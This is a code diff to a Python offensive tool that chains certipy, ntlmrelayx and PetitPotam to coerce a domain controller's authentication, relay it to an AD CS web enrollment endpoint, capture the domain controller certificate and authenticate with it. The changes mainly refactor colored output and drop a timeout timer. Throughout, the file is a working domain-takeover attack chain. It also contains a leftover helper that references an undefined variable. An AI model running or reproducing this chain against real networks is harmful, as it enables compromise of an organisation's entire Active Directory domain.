@@ -17,7 +17,7 @@ import fcntl
 import struct
 import base64
 import threading
-
+from termcolor import colored
 
 def get_ip_address(ifname):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -27,101 +27,104 @@ def get_ip_address(ifname):
         struct.pack('256s', ifname[:15].encode('utf-8'))  # Encode string as bytes
     )[20:24])
 
+def pretty_print(line, verbose=False):
+    line = line.rstrip('\n')  # remove trailing newline characters
+    colored_line = line
+    if verbose:
+        if line.startswith("[*]"):
+            colored_line = line.replace("[*]", colored("[*]", "green"))
+        elif line.startswith("[!]"):
+            colored_line = line.replace("[!]", colored("[!]", "red"))
+        print(colored_line)
+    elif line.startswith("[*]"):
+        colored_line = line.replace("[*]", colored("[*]", "green"))
+        print(colored_line)
 
 def certipy_auth(certname,  domain, verbose=False):
     pfx = certname + ".pfx"
     command = ["certipy", "auth", "-pfx", pfx, "-username", certname, "-domain", domain]
-    print(command)
     process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
     for line in process.stdout:
-        if line.startswith("[*]"):
-            print("\033[92m" + line + "\033[0m", end='')  # Print in green
-        elif line.startswith("[!]"):
-            if verbose:
-                print("\033[91m" + line + "\033[0m", end='')  # Print in red
+        pretty_print(line, verbose)
     process.wait()
 
 def certipy_find(username, password, domain, verbose=False):
     command = ["certipy", "find", "-u", username, "-p", password, "-target", domain, "-output", "adcs"]
     process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
     for line in process.stdout:
-        if line.startswith("[*]"):
-            print("\033[92m" + line + "\033[0m", end='')  # Print in green
-        elif line.startswith("[!]"):
-            if verbose:
-                print("\033[91m" + line + "\033[0m", end='')  # Print in red
+        pretty_print(line, verbose)
     process.wait()
+
 
 def run_ntlmrelayx_and_petitpotam(username, password, domain, verbose=False):
     with open("adcs_Certipy.json", "r") as file:
         data = json.load(file)
 
     certificate_authorities = data.get("Certificate Authorities")
+    ca_found = False
     if certificate_authorities:
         for ca in certificate_authorities.values():
             web_enrollment = ca.get("Web Enrollment")
             dns_name = ca.get("DNS Name")
             if web_enrollment == "Enabled" and dns_name:
-                print("Start ntlmrelayx...")
-                ntlmrelayx_command = f"ntlmrelayx.py --target http://{dns_name}/certsrv/certfnsh.asp --adcs --template DomainController"
-                print("Start PetitPotam...")
-                petitpotam_command = f"python PetitPotam.py -u {username} -p {password} {get_ip_address('eth0')} {domain}"
+                ca_found = True
+                ntlmrelayx_command = (
+                    f"ntlmrelayx.py --target http://{dns_name}/certsrv/certfnsh.asp "
+                    "--adcs --template DomainController"
+                )
+                pretty_print("[*] " + ntlmrelayx_command, verbose)
+
+                petitpotam_command = (
+                    f"python PetitPotam.py -u {username} -p {password} "
+                    f"{get_ip_address('eth0')} {domain}"
+                )
+                pretty_print("[*] " + petitpotam_command, verbose)
 
                 # Run ntlmrelayx
-                print("Capture ntlmrelayx..")
-                with subprocess.Popen(ntlmrelayx_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) as ntlmrelayx_process:
+                with subprocess.Popen(
+                    ntlmrelayx_command, shell=True, stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT
+                ) as ntlmrelayx_process:
 
                     # Run PetitPotam
-                    print("Capture Petitpotam Output")
-                    with subprocess.Popen(petitpotam_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True) as petitpotam_process:
+                    with subprocess.Popen(
+                        petitpotam_command, shell=True, stdout=subprocess.PIPE,
+                        stderr=subprocess.STDOUT, universal_newlines=True
+                    ) as petitpotam_process:
 
                         # Print ntlmrelayx output as it's generated if verbose flag is set
                         for line in iter(ntlmrelayx_process.stdout.readline, b''):
-                            if verbose:
-                                print(line.decode().strip())
+                            line = line.decode().strip()
+                            pretty_print(line, verbose)
 
-                            cert = re.search(r"Base64 certificate of user (\w+\$?):", line.decode().strip())
+                            cert = re.search(r"Base64 certificate of user (\w+\$?):", line)
                             if cert is not None:
                                 certname = cert.group(1)
-                                base64_certificate = next(iter(ntlmrelayx_process.stdout.readline, b''))
+                                base64_certificate = next(
+                                    iter(ntlmrelayx_process.stdout.readline, b'')
+                                )
                                 if verbose:
                                     print("\033[93m" + base64_certificate.decode().strip() + "\033[0m")
 
                                 # Extract base64 certificate from ntlmrelayx output
-                                    print("Killing process...")
-                                    save_certificate(certname, base64_certificate)
-                                    certipy_auth(certname,  domain, verbose)
+                                save_certificate(certname, base64_certificate)
+                                certipy_auth(certname,  domain, verbose)
 
-                                    ntlmrelayx_process.terminate()
-                                    break  # Stop reading output once we have the certificate
+                                ntlmrelayx_process.terminate()
+                                break  # Stop reading output once we have the certificate
 
-
-                        # Create a timer to stop the process after a certain amount of time
-                        def stop_process(process):
-                            if process.poll() is None:  # If the process is still running
-                                print("Timeout, terminating process")
-                                process.kill(signal.SIGTERM)
-
-                        # Set the timer for 30 seconds (or however long you think is appropriate)
-                        timer = threading.Timer(30, stop_process, [ntlmrelayx_process])
-                        timer.start()
-
-                        # Wait for the timer to expire or the process to terminate
-                        timer.join()
 
                         if ntlmrelayx_process.poll() is None:
                             print("Process terminated due to timeout")
 
-                # Call stop_process() manually
-                stop_process(ntlmrelayx_process)
-
+    if not ca_found:
+        print("\033[91m[!] There are no Certificate Authorities with web enrollment enabled :( womp womp \033[0m", end='')  # Print in red
 
 def extract_base64_certificate(output):
     match = next(iter(ntlmrelayx_process.stdout.readline, b''))
     if match:
         print("\033[93m" + match + "\033[0m")
         base64_certificate = match.group(1).strip()
-        print("FUCK")
         print("\033[93m" + base64_certificate + "\033[0m")
         return base64_certificate
     else:
@@ -160,4 +163,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
